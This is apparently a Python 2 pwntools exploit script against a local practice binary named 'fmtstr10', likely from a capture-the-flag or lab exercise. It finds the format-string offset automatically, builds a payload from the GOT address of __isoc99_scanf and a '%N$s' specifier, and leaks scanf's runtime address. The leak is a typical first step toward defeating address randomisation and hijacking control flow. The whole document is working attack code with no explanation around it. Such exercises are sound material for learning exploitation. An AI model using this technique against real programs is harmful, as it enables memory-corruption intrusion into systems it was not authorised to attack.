from pwn import *
context(arch = 'i386', os = 'linux', log_level='debug')

def fmt_str(payload):
	p = process('./fmtstr10')
	p.sendline(payload)
	return p.recvall()
	
autofmt = FmtStr(fmt_str)
offset = autofmt.offset
print "offset = " + hex(offset) 
p = process("./fmtstr10", stderr=PIPE)
elf = p.elf
scanf_got = elf.got["__isoc99_scanf"]
print hex(scanf_got)
payload = p32(scanf_got) + "%"+ str(offset) +"$s"
print payload
p.sendline(payload)
p.recv(4)
data = ''
c = p.recvall()
if len(c) == 3:
	data += c[0:3]
	data += '\x00'
else:
	data = c
log.info("=> %s" % (data or '').encode('hex'))
scanf_addr = int(data.encode('hex'), 16)
scanf_addr = struct.pack("<i", scanf_addr)
scanf_addr = int(scanf_addr.encode("hex"), 16)
print hex(scanf_addr)
p.close()


